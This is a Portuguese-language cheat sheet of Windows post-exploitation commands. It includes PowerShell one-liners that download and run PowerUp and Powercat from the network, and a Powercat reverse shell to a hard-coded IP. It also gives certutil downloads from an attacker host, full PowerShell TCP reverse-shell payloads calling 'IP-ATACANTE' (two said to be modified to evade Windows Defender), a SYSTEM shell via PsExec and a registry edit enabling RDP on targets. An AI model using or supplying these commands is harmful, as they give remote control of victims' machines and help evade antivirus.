FERRAMENTAS E COMANDOS ÚTEIS

-Psexec: Download em: https://download.sysinternals.com/files/PSTools.zip
          PsExec64.exe -s -accepteula  cmd.exe –i: Chamar um shell de system

-Powerup.ps1(Ferramenta para buscar pontos de enumerar/escalação de privilegio):
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks"

-Powercat.ps1(Powercat: Script p obter o shell reverso/bind e tunelamento cmd e powershell):
powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.201.10 -p 8001 -e cmd"

-Executar script sem necessidade de fazer download dele no disco do alvo (IEX):
powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-ObjectNet.WebClient).downloadString('http://192.168.1.2:8000/exploit.ps1')"

-Plink(Criar script.bat ):
cd C:\Program Files\PuTTY
PLINK.EXE –i F:\key\key.ppk user@ip –no-antispoof –ssh sh script.sh
exit

-Ssh/scp (transferir arquivos, tunelamentos, etc)

-certutil -urlcache -split -f http://ip_atacante:porta/arquivo nome_do_arquivo (download arq):


-Nc.exe: Ferramenta para conexões de redes (igual do linux). (/usr/share/windows-binaries)

powershell.exe -ExecutionPolicy Bypass -noLogo -Command "$client = New-Object System.Net.Sockets.TCPClient('IP-ATACANTE',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()": Comando para pegar um shell reverso de powershell (Comando tirado da internet, o  windows defender consegue bloquear)


cmd.exe /c powershell.exe -ExecutionPolicy Bypass -noLogo -c "$client = New-Object System.Net.Sockets.TCPClient(echo IP-ATACANTE,8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.utf8Encoding).GetString($bytes,0, $i);$sendback = (powershell.exe -c $data 2>&1 | out-string);$sendback2 = $sendback + (pwd).Path + (echo `>` );$sendbyte = ([text.encoding]::utf8).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()": Comando para pegar um shell reverso de powershell (Esse comando foi modificado, o Windows defender não pega [não postem na internet!!])


cmd.exe /c powershell.exe -ExecutionPolicy Bypass -noLogo -c "$client = New-Object System.Net.Sockets.TCPClient(echo IP-ATACANTE,8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.utf8Encoding).GetString($bytes,0, $i);$sendback = (cmd.exe /c $data 2>&1 | out-string);$sendback2 = $sendback + (pwd).Path + (echo `>` );$sendbyte = ([text.encoding]::utf8).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()": Comando para pegar um shell reverso de cmd (Esse comando foi modificado, o Windows defender não pega [não postem na internet!!])


reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f: Comando para editar chave do registro para tentar ativar o  na maquina (Nem todas as versões do Windows possuem suporte a !).

rdesktop IP_do_alvo: Client  para Linux, para logar em uma maquina windows via . 

free /u:usuario /p:senha /w:1366 /h:768 /v:IP_DO_ALVO /smart-sizing +auto-reconnect : Client  para Linux, para logar em uma maquina Windows via .

remmina: Client de acesso remoto para Linux, para logar em maquinas via  ou VNC.

GOOGLE!! 

-----------------------------------------------------------------
